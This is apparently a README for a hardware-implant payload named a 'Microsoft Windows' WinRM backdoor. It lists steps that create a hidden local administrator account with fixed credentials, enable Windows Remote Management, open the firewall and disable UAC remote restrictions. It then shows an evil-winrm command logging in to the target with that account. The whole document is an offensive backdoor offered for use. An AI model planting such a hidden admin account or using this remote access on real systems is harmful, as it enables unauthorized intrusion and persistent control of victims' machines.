# "Microsoft Windows" WinRM Backdoor

- Title:         "Microsoft Windows" WinRM Backdoor
- Author:        TW-D
- Version:       1.0
- Target:        Microsoft Windows
- Category:      Remote Access

## Description

1) Adds a user account (OMG_User:OMG_P@ssW0rD).
2) Adds this local user to local administrator group.
3) Enables "Windows Remote Management" with default settings.
4) Adds a rule to the firewall.
5) Sets a value to "LocalAccountTokenFilterPolicy" to disable "UAC" remote restrictions.
6) Hides this user account.

## Exploitation

>
> The connection identifiers will be those defined by the values : **OMG_User** and **OMG_P@ssW0rD**.
>

```
hacker@hacker-computer:~$ evil-winrm --ip <TARGET> --user OMG_User --password 'OMG_P@ssW0rD'
*Evil-WinRM* PS C:\Users\OMG_User\Documents> whoami
desktop-xxxxxxx\omg_user
```
